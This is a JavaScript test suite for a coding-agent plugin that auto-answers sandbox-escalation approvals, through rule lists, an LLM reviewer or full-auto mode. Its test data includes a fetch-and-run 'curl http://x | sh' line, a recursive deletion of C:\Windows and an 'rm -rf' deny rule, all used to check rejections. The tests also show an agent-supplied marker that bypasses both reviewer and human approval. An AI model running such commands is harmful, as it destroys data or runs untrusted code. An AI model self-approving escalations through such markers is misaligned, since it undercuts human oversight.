import { test } from "node:test";
import assert from "node:assert/strict";
import { APPROVE_FOR_ME_MARKER, APPROVE_FOR_ME_MODE } from "../lib/policy.js";
import { Config, apply, inject, name } from "../lib/index.js";

/** Minimal cordis-shaped context covering everything apply() touches. */
function makeCtx(defs, overrides = {}) {
  const listeners = new Map();
  const logged = [];
  const promptSections = [];
  const presets = {};
  return {
    defs,
    listeners,
    logged,
    promptSections,
    presets,
    llm: overrides.llm,
    tools: {
      layers: {
        global: {
          tools: {
            values: () => defs.values()
          }
        }
      }
    },
    logger: { info: (...args) => logged.push(args.join(" ")), warn: (...args) => logged.push(`WARN ${args.join(" ")}`) },
    on: (event, listener) => {
      if (!listeners.has(event)) listeners.set(event, []);
      listeners.get(event).push(listener);
    },
    get: (service) => {
      if (service === "permissionPresets") return { presets };
      if (service === "llm") return overrides.llm;
      return undefined;
    },
    inject: (services, callback) => {
      callback({
        systemPrompt: {
          context: (entry) => promptSections.push(entry)
        }
      });
    }
  };
}

function fakePwshDef() {
  const calls = [];
  const def = {
    name: "pwsh",
    parameters: {
      sandbox_permissions: {
        type: "string",
        enum: ["workspace-write", "danger-full-access"],
        description: "The wider sandbox mode this command needs."
      },
      justification: { type: "string" }
    },
    execute: async (args) => {
      calls.push(args);
      return { kind: "foreground", exitCode: 0, calls: calls.length };
    }
  };
  return { def, calls };
}

function fakeSession(events, id = "sess-1") {
  const appended = [];
  return {
    header: { id },
    events,
    appended,
    append: (type, data, opts) => {
      appended.push({ type, data, opts });
      return { type, data, ...opts };
    }
  };
}

/** A realistic fake agent: `req.agent` in DSH is the Agent, which owns `.session` and carries `agentOptions`. */
function fakeAgent(events, agentOptions = { provider: "deepseek", model: "deepseek-chat" }) {
  const injected = [];
  return {
    session: fakeSession(events),
    agentOptions,
    injected,
    inject: (message) => injected.push(message)
  };
}

/** A fake `ctx.llm` whose `stream` returns one canned text payload (or throws). */
function fakeLlm(text, { throwError } = {}) {
  return {
    stream: async function* () {
      if (throwError) throw new Error(throwError);
      yield { type: "text-delta", index: 0, text };
    }
  };
}

function sessionEvents(callId, command) {
  return [
    { type: "user/message", data: { content: [{ type: "text", text: "please set up the project" }] } },
    { type: "assistant/message", data: { message: { content: [{ type: "text", text: "running the setup command" }] } } },
    { type: "tool/call", data: { callId, name: "pwsh", arguments: JSON.stringify({ command }) } }
  ];
}

test("plugin contract exports are present", () => {
  assert.equal(name, "approve-for-me");
  assert.deepEqual(inject, ["tools", "systemPrompt"]);
  assert.equal(typeof apply, "function");
  assert.equal(typeof Config, "function");
});

test("Config schema defaults and validates", () => {
  const defaults = Config({});
  assert.equal(defaults.mode, "off");
  assert.equal(defaults.grantMode, "danger-full-access");
  assert.equal(defaults.presetName, "approve-for-me");
  assert.equal(defaults.presetSandbox, "workspace-write");
  assert.equal(defaults.strictPresetName, "strict-review");
  assert.equal(defaults.strictPresetSandbox, "workspace-write");
  assert.equal(defaults.reviewNotify, false);
  const custom = Config({ mode: "review", grantMode: "workspace-write", approve: ["^git "], deny: ["rm -rf"], reviewTimeoutMs: 1000 });
  assert.equal(custom.mode, "review");
  assert.equal(custom.grantMode, "workspace-write");
  assert.equal(custom.reviewTimeoutMs, 1000);
  assert.throws(() => Config({ mode: "bogus" }));
  assert.throws(() => Config({ reviewTimeoutMs: -1 }));
});

test("apply patches the sandbox_permissions enum and wraps execute", async () => {
  const { def, calls } = fakePwshDef();
  const ctx = makeCtx(new Map([["pwsh", def]]));
  apply(ctx, Config({}));

  const spec = def.parameters.sandbox_permissions;
  assert.ok(spec.enum.includes(APPROVE_FOR_ME_MODE));
  assert.ok(spec.description.includes(APPROVE_FOR_ME_MODE));

  // approve-for-me call → translated to the grant mode with the marker.
  const result = await def.execute(
    { command: "npm i -g x", sandbox_permissions: APPROVE_FOR_ME_MODE, justification: "install a global tool" },
    { agent: undefined }
  );
  assert.equal(result.calls, 1);
  const rewritten = calls[0];
  assert.equal(rewritten.sandbox_permissions, "danger-full-access");
  assert.equal(rewritten.justification, `${APPROVE_FOR_ME_MARKER} install a global tool`);
  assert.equal(rewritten.command, "npm i -g x");

  // plain call passes through unchanged.
  await def.execute({ command: "git status" }, {});
  assert.deepEqual(calls[1], { command: "git status" });

  // approve-for-me without justification fails closed.
  await assert.rejects(
    () => def.execute({ command: "x", sandbox_permissions: APPROVE_FOR_ME_MODE }, {}),
    /requires a justification/
  );
});

test("answerer: off mode delegates, marker approves", async () => {
  const { def } = fakePwshDef();
  const ctx = makeCtx(new Map([["pwsh", def]]));
  apply(ctx, Config({}));
  const [answerer] = ctx.listeners.get("approval/request");

  const next = async () => "unavailable";
  assert.equal(
    await answerer({ agent: fakeAgent([]), toolName: "pwsh", reason: "escalate sandbox to danger-full-access: install pkg" }, next),
    "unavailable"
  );
  assert.equal(
    await answerer({ agent: fakeAgent([]), toolName: "pwsh", reason: `escalate sandbox to danger-full-access: ${APPROVE_FOR_ME_MARKER} install pkg` }, next),
    "allowed-once"
  );
  assert.equal(await answerer({ agent: fakeAgent([]), toolName: "pwsh", reason: "x", signal: { aborted: true } }, next), "cancelled");
});

test("answerer: full-auto and never modes", async () => {
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]));
  apply(ctx, Config({ mode: "full-auto" }));
  const [answerer] = ctx.listeners.get("approval/request");
  assert.equal(await answerer({ agent: fakeAgent([]), toolName: "bash", reason: "anything" }, async () => "unavailable"), "allowed-once");

  const ctx2 = makeCtx(new Map([["pwsh", fakePwshDef().def]]));
  apply(ctx2, Config({ mode: "never" }));
  const [answerer2] = ctx2.listeners.get("approval/request");
  assert.equal(await answerer2({ agent: fakeAgent([]), toolName: "bash", reason: "anything" }, async () => "unavailable"), "rejected");
});

test("answerer: active approve-for-me preset approves everything", async () => {
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]));
  apply(ctx, Config({})); // mode off — preset must win
  const [answerer] = ctx.listeners.get("approval/request");
  const agent = fakeAgent([{ type: "permission/preset", data: { preset: "approve-for-me" } }]);
  assert.equal(await answerer({ agent, toolName: "pwsh", reason: "escalate sandbox to danger-full-access: install" }, async () => "unavailable"), "allowed-once");
});

test("answerer: auto mode matches tool name, command text, deny, and delegates otherwise", async () => {
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]));
  apply(ctx, Config({ mode: "auto", approve: ["^git ", "^npm "], deny: ["rm -rf"] }));
  const [answerer] = ctx.listeners.get("approval/request");
  const next = async () => "unavailable";

  // command text recovered from the tool/call session event by callId.
  const withCommand = fakeAgent(sessionEvents("c1", "git add -A"));
  assert.equal(await answerer({ agent: withCommand, toolName: "pwsh", callId: "c1", reason: "escalate sandbox to workspace-write: stage files" }, next), "allowed-once");

  // deny wins over approve.
  const denied = fakeAgent(sessionEvents("c2", "rm -rf node_modules"));
  assert.equal(await answerer({ agent: denied, toolName: "pwsh", callId: "c2", reason: "clean" }, next), "rejected");

  // no match → delegate.
  assert.equal(await answerer({ agent: fakeAgent([]), toolName: "pwsh", reason: "escalate sandbox to danger-full-access: anything else" }, next), "unavailable");
});

/** A fake agent whose session selected the review preset and has a model route. */
function reviewAgent(callId, command, extraEvents = []) {
  return fakeAgent([
    ...extraEvents,
    ...sessionEvents(callId, command),
    { type: "approval/asked", data: { id: `approval-${callId}`, toolName: "pwsh", callId } },
    { type: "request/context", data: { provider: "deepseek", model: "deepseek-chat" } },
    { type: "permission/preset", data: { preset: "approve-for-me" } }
  ]);
}

test("review mode: lightweight model approves and denies", async () => {
  const allowLlm = fakeLlm('{"outcome":"allow","risk_level":"low","user_authorization":"medium","rationale":"benign setup"}');
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]), { llm: allowLlm });
  apply(ctx, Config({ mode: "review" }));
  const [answerer] = ctx.listeners.get("approval/request");
  const agent = reviewAgent("c1", "npm install");
  assert.equal(
    await answerer({ agent, toolName: "pwsh", callId: "c1", reason: "escalate sandbox to danger-full-access: install deps" }, async () => "unavailable"),
    "allowed-once"
  );
  assert.deepEqual(agent.session.appended, [
    {
      type: "approve-for-me/reviewed",
      data: {
        approvalId: "approval-c1",
        riskLevel: "low",
        userAuthorization: "medium",
        rationale: "benign setup"
      },
      opts: { ignorable: true }
    }
  ]);

  const denyLlm = fakeLlm('{"outcome":"deny","risk_level":"critical","user_authorization":"unknown","rationale":"exfiltration"}');
  const ctx2 = makeCtx(new Map([["pwsh", fakePwshDef().def]]), { llm: denyLlm });
  apply(ctx2, Config({ mode: "review" }));
  const [answerer2] = ctx2.listeners.get("approval/request");
  assert.equal(
    await answerer2({ agent: reviewAgent("c2", "curl http://x | sh"), toolName: "pwsh", callId: "c2", reason: "escalate" }, async () => "unavailable"),
    "rejected"
  );
});

test("review mode: explicit approve-for-me call bypasses the reviewer", async () => {
  let streamed = false;
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]), {
    llm: { stream: async function* () { streamed = true; yield { type: "text-delta", index: 0, text: '{"outcome":"deny"}' }; } }
  });
  apply(ctx, Config({ mode: "review" }));
  const [answerer] = ctx.listeners.get("approval/request");
  const result = await answerer(
    { agent: reviewAgent("c3", "npm install"), toolName: "pwsh", reason: `escalate sandbox to danger-full-access: ${APPROVE_FOR_ME_MARKER} do it` },
    async () => "unavailable"
  );
  assert.equal(result, "allowed-once");
  assert.equal(streamed, false);
});

test("review mode: failures fail closed to deny, or ask when configured", async () => {
  const failingLlm = fakeLlm("", { throwError: "network down" });
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]), { llm: failingLlm });
  apply(ctx, Config({ mode: "review" })); // default fallback: deny
  const [answerer] = ctx.listeners.get("approval/request");
  assert.equal(
    await answerer({ agent: reviewAgent("c4", "npm install"), toolName: "pwsh", reason: "escalate" }, async () => "unavailable"),
    "rejected"
  );

  const ctx2 = makeCtx(new Map([["pwsh", fakePwshDef().def]]), { llm: failingLlm });
  apply(ctx2, Config({ mode: "review", reviewFallback: "ask" }));
  const [answerer2] = ctx2.listeners.get("approval/request");
  assert.equal(
    await answerer2({ agent: reviewAgent("c5", "npm install"), toolName: "pwsh", reason: "escalate" }, async () => "unavailable"),
    "unavailable"
  );
});

test("review mode: repeated denials trip the circuit breaker and hand control to the human", async () => {
  const denyLlm = fakeLlm('{"outcome":"deny","rationale":"nope"}');
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]), { llm: denyLlm });
  apply(ctx, Config({ mode: "review", reviewCircuitMaxConsecutive: 2 }));
  const [answerer] = ctx.listeners.get("approval/request");
  const agent = reviewAgent("c6", "npm install", [{ type: "turn/start", data: { turn: 1 } }]);
  const req = () => ({ agent, toolName: "pwsh", reason: "escalate sandbox to danger-full-access: x" });
  assert.equal(await answerer(req(), async () => "unavailable"), "rejected"); // 1st denial
  assert.equal(await answerer(req(), async () => "unavailable"), "unavailable"); // 2nd denial trips the breaker → human
  assert.equal(await answerer(req(), async () => "unavailable"), "unavailable"); // stays delegated
});

test("review mode: reviewer prompt carries the transcript and action, and inherits the session model route", async () => {
  let seen = null;
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]), {
    llm: {
      stream: async function* (options) {
        seen = options;
        yield { type: "text-delta", index: 0, text: '{"outcome":"allow"}' };
      }
    }
  });
  apply(ctx, Config({ mode: "review" }));
  const [answerer] = ctx.listeners.get("approval/request");
  // The session's live model route is recorded in `request/context` events.
  const events = [
    ...sessionEvents("c9", "git push"),
    { type: "request/context", data: { provider: "deepseek", model: "deepseek-chat" } },
    { type: "permission/preset", data: { preset: "approve-for-me" } }
  ];
  const agent = fakeAgent(events);
  await answerer({ agent, toolName: "pwsh", callId: "c9", reason: "escalate sandbox to danger-full-access: push" }, async () => "unavailable");
  assert.ok(seen);
  assert.equal(seen.provider, "deepseek");
  assert.equal(seen.model, "deepseek-chat");
  assert.ok(seen.system.includes("You are judging one planned coding-agent action."));
  assert.ok(seen.system.includes('"outcome": "allow" | "deny"'));
  assert.ok(seen.messages.length === 1);
  const userText = seen.messages[0].content.map((b) => b.text).join("");
  assert.ok(userText.includes(">>> TRANSCRIPT START"));
  assert.ok(userText.includes("Reviewed DSH session id: sess-1"));
  assert.ok(userText.includes('"tool": "pwsh"'));
  assert.ok(userText.includes('"command": "git push"'));
  assert.ok(userText.includes(">>> APPROVAL REQUEST END"));
});

test("review mode: without the preset, every request delegates to native approval", async () => {
  let reviewerCalls = 0;
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]), {
    llm: {
      stream: async function* () {
        reviewerCalls += 1;
        yield { type: "text-delta", index: 0, text: '{"outcome":"allow"}' };
      }
    }
  });
  apply(ctx, Config({ mode: "review" }));
  const [answerer] = ctx.listeners.get("approval/request");
  const agent = fakeAgent([
    ...sessionEvents("c10", "npm install"),
    { type: "request/context", data: { provider: "deepseek", model: "deepseek-chat" } }
  ]);
  let delegated = 0;
  const next = async () => {
    delegated += 1;
    return "unavailable";
  };

  assert.equal(await answerer({ agent, toolName: "pwsh", callId: "c10", reason: "escalate" }, next), "unavailable");
  assert.equal(
    await answerer({ agent, toolName: "pwsh", callId: "c10", reason: `escalate: ${APPROVE_FOR_ME_MARKER}` }, next),
    "unavailable"
  );
  assert.equal(delegated, 2);
  assert.equal(reviewerCalls, 0);
});

test("Strict Mode reviews every tool call before it executes and includes the exact arguments", async () => {
  let seen = null;
  const { def, calls } = fakePwshDef();
  const ctx = makeCtx(new Map([["pwsh", def]]), {
    llm: {
      stream: async function* (options) {
        seen = options;
        yield { type: "text-delta", index: 0, text: '{"outcome":"allow","risk_level":"low","user_authorization":"high","rationale":"The requested status check is read-only."}' };
      }
    }
  });
  apply(ctx, Config({ mode: "review" }));
  const [gate] = ctx.listeners.get("tools/pre-execute");
  const agent = fakeAgent([
    ...sessionEvents("strict-allow", "git status"),
    { type: "request/context", data: { provider: "deepseek", model: "deepseek-chat" } },
    { type: "permission/preset", data: { preset: "strict-review" } }
  ]);
  const signal = new AbortController().signal;
  const exec = { agent, name: "pwsh", callId: "strict-allow", arguments: { command: "git status", cwd: "C:\\repo" }, signal };
  let delegated = 0;
  const decision = await gate(exec, async () => {
    delegated += 1;
    await def.execute(exec.arguments, exec);
    return { kind: "allow" };
  });

  assert.deepEqual(decision, { kind: "allow" });
  assert.equal(delegated, 1);
  assert.equal(calls.length, 1);
  assert.ok(seen);
  const action = JSON.parse(seen.messages[0].content[0].text.match(/Planned action JSON:\n([\s\S]*?)\n>>> APPROVAL REQUEST END/)[1]);
  assert.equal(action.tool, "pwsh");
  assert.deepEqual(action.arguments, { command: "git status", cwd: "C:\\repo" });
  assert.deepEqual(
    agent.session.appended.map((entry) => [entry.type, entry.data.outcome]),
    [
      ["approve-for-me/strict-review-started", undefined],
      ["approve-for-me/strict-reviewed", "allowed"]
    ]
  );
});

test("Strict Mode denies before the tool body executes", async () => {
  const { def, calls } = fakePwshDef();
  const ctx = makeCtx(new Map([["pwsh", def]]), {
    llm: fakeLlm('{"outcome":"deny","risk_level":"critical","user_authorization":"unknown","rationale":"Deleting the operating system is irreversible."}')
  });
  apply(ctx, Config({ mode: "review" }));
  const [gate] = ctx.listeners.get("tools/pre-execute");
  const agent = fakeAgent([
    ...sessionEvents("strict-deny", "Remove-Item -LiteralPath C:\\Windows -Recurse -Force"),
    { type: "request/context", data: { provider: "deepseek", model: "deepseek-chat" } },
    { type: "permission/preset", data: { preset: "strict-review" } }
  ]);
  let delegated = 0;
  const decision = await gate(
    {
      agent,
      name: "pwsh",
      callId: "strict-deny",
      arguments: { command: "Remove-Item -LiteralPath C:\\Windows -Recurse -Force" },
      signal: new AbortController().signal
    },
    async () => {
      delegated += 1;
      await def.execute({ command: "unexpected" }, {});
      return { kind: "allow" };
    }
  );

  assert.equal(decision.kind, "deny");
  assert.match(decision.reason, /Deleting the operating system/);
  assert.equal(delegated, 0);
  assert.equal(calls.length, 0);
  assert.equal(agent.session.appended.at(-1).data.outcome, "rejected");
});

test("Strict Mode hands reviewer failures to the native approval gate when configured", async () => {
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]), {
    llm: fakeLlm("", { throwError: "review service unavailable" })
  });
  apply(ctx, Config({ mode: "review", reviewFallback: "ask" }));
  const [gate] = ctx.listeners.get("tools/pre-execute");
  const agent = fakeAgent([
    ...sessionEvents("strict-ask", "npm install"),
    { type: "request/context", data: { provider: "deepseek", model: "deepseek-chat" } },
    { type: "permission/preset", data: { preset: "strict-review" } }
  ]);
  let delegated = 0;
  const decision = await gate(
    { agent, name: "pwsh", callId: "strict-ask", arguments: { command: "npm install" }, signal: new AbortController().signal },
    async () => {
      delegated += 1;
      return { kind: "allow" };
    }
  );

  assert.equal(decision.kind, "ask");
  assert.equal(delegated, 0);
  assert.equal(agent.session.appended.at(-1).data.outcome, "ask");
  assert.match(agent.session.appended.at(-1).data.rationale, /review service unavailable/);
});

test("Approve For Me does not review non-escalating calls, while Strict Mode reviews an escalation once", async () => {
  let reviewerCalls = 0;
  const { def } = fakePwshDef();
  const ctx = makeCtx(new Map([["pwsh", def]]), {
    llm: {
      stream: async function* () {
        reviewerCalls += 1;
        yield { type: "text-delta", index: 0, text: '{"outcome":"allow","risk_level":"low","user_authorization":"high","rationale":"Authorized."}' };
      }
    }
  });
  apply(ctx, Config({ mode: "review" }));
  const [gate] = ctx.listeners.get("tools/pre-execute");
  const [answerer] = ctx.listeners.get("approval/request");

  const normalAgent = fakeAgent([
    ...sessionEvents("normal-call", "git status"),
    { type: "request/context", data: { provider: "deepseek", model: "deepseek-chat" } },
    { type: "permission/preset", data: { preset: "approve-for-me" } }
  ]);
  let normalDelegated = 0;
  assert.deepEqual(
    await gate(
      { agent: normalAgent, name: "pwsh", callId: "normal-call", arguments: { command: "git status" }, signal: new AbortController().signal },
      async () => {
        normalDelegated += 1;
        return { kind: "allow" };
      }
    ),
    { kind: "allow" }
  );
  assert.equal(normalDelegated, 1);
  assert.equal(reviewerCalls, 0);

  const strictAgent = fakeAgent([
    ...sessionEvents("strict-escalation", "npm install"),
    { type: "request/context", data: { provider: "deepseek", model: "deepseek-chat" } },
    { type: "permission/preset", data: { preset: "strict-review" } }
  ]);
  let approvalDelegated = 0;
  await gate(
    {
      agent: strictAgent,
      name: "pwsh",
      callId: "strict-escalation",
      arguments: { command: "npm install", sandbox_permissions: "danger-full-access", justification: "install dependencies" },
      signal: new AbortController().signal
    },
    async () => {
      assert.equal(
        await answerer(
          { agent: strictAgent, toolName: "pwsh", callId: "strict-escalation", reason: "escalate sandbox to danger-full-access: install dependencies" },
          async () => {
            approvalDelegated += 1;
            return "unavailable";
          }
        ),
        "allowed-once"
      );
      return { kind: "allow" };
    }
  );
  assert.equal(reviewerCalls, 1);
  assert.equal(approvalDelegated, 0);
});

test("review mode: queues only the terminal verdict when review notices are enabled", async () => {
  const allowLlm = fakeLlm('{"outcome":"allow","risk_level":"low","user_authorization":"medium","rationale":"benign setup"}');
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]), { llm: allowLlm });
  apply(ctx, Config({ mode: "review", reviewNotify: true }));
  const [answerer] = ctx.listeners.get("approval/request");
  const agent = reviewAgent("c7", "npm install");
  assert.equal(
    await answerer({ agent, toolName: "pwsh", callId: "c7", reason: "escalate sandbox to danger-full-access: install" }, async () => "unavailable"),
    "allowed-once"
  );
  // A terminal notice goes through agent.inject (inbox) and surfaces after the
  // pending tool call settles. Progress is deliberately not injected because
  // inbox rendering is delayed and can leave a stale "reviewing" row in the UI.
  assert.equal(agent.injected.length, 1);
  assert.equal(agent.session.appended.length, 1); // durable, log-only reviewer rationale
  assert.equal(agent.session.appended[0].type, "approve-for-me/reviewed");
  assert.equal(agent.session.appended[0].data.rationale, "benign setup");
  // Verdict notice: collapsed-row summary directly readable (form: notice).
  assert.equal(agent.injected[0].source.kind, "plugin");
  assert.equal(agent.injected[0].source.form, "notice");
  assert.match(agent.injected[0].source.summary, /自动审查通过（risk: low，authorization: medium）/);
  assert.match(agent.injected[0].content[0].text, /benign setup/);
  assert.match(agent.injected[0].content[0].text, /已批准/);
});

test("review mode: terminal notice is opt-in", async () => {
  const denyLlm = fakeLlm('{"outcome":"deny","risk_level":"critical","user_authorization":"unknown","rationale":"exfiltration"}');
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]), { llm: denyLlm });
  apply(ctx, Config({ mode: "review", reviewNotify: true }));
  const [answerer] = ctx.listeners.get("approval/request");
  const agent = reviewAgent("c8", "curl http://x | sh");
  assert.equal(
    await answerer({ agent, toolName: "pwsh", callId: "c8", reason: "escalate" }, async () => "unavailable"),
    "rejected"
  );
  assert.equal(agent.injected.length, 1);
  assert.match(agent.injected[0].source.summary, /自动审查拒绝/);
  assert.match(agent.injected[0].content[0].text, /exfiltration/);
  assert.match(agent.injected[0].content[0].text, /已拒绝/);

  const quietCtx = makeCtx(new Map([["pwsh", fakePwshDef().def]]), { llm: denyLlm });
  apply(quietCtx, Config({ mode: "review" }));
  const [quietAnswerer] = quietCtx.listeners.get("approval/request");
  const quietAgent = reviewAgent("c9", "curl http://x | sh");
  assert.equal(await quietAnswerer({ agent: quietAgent, toolName: "pwsh", callId: "c9", reason: "escalate" }, async () => "unavailable"), "rejected");
  assert.equal(quietAgent.injected.length, 0);
});

test("apply registers the approve-for-me permission preset", () => {
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]));
  apply(ctx, Config({}));
  assert.ok(Object.hasOwn(ctx.presets, "approve-for-me"));
  assert.equal(ctx.presets["approve-for-me"].sandbox, "workspace-write");
  assert.equal(ctx.presets["approve-for-me"].approval, "ask");
  assert.match(ctx.presets["approve-for-me"].name, /Approve For Me/);
  assert.ok(Object.hasOwn(ctx.presets, "strict-review"));
  assert.equal(ctx.presets["strict-review"].sandbox, "workspace-write");
  assert.equal(ctx.presets["strict-review"].approval, "ask");
  assert.match(ctx.presets["strict-review"].name, /Strict Mode/);
});

test("apply registers a system-prompt section describing the mode", () => {
  const ctx = makeCtx(new Map([["pwsh", fakePwshDef().def]]));
  apply(ctx, Config({ mode: "full-auto" }));
  const section = ctx.promptSections.find((entry) => entry.name === "approve-for-me:mode");
  assert.ok(section);
  assert.equal(section.order, 116);
  assert.match(section.text({ agent: fakeAgent([]) }), /full-auto/);
  assert.equal(section.text({ agent: undefined }), "");
  assert.match(section.text({ agent: fakeAgent([{ type: "permission/preset", data: { preset: "approve-for-me" } }]) }), /Approve For Me/);

  const reviewCtx = makeCtx(new Map([["pwsh", fakePwshDef().def]]));
  apply(reviewCtx, Config({ mode: "review", reviewModel: "deepseek-chat" }));
  const reviewSection = reviewCtx.promptSections.find((entry) => entry.name === "approve-for-me:mode");
  assert.match(reviewSection.text({ agent: fakeAgent([]) }), /review/);
  assert.match(reviewSection.text({ agent: fakeAgent([]) }), /deepseek-chat/);
  assert.match(
    reviewSection.text({ agent: fakeAgent([{ type: "permission/preset", data: { preset: "strict-review" } }]) }),
    /assesses every tool call/
  );
});
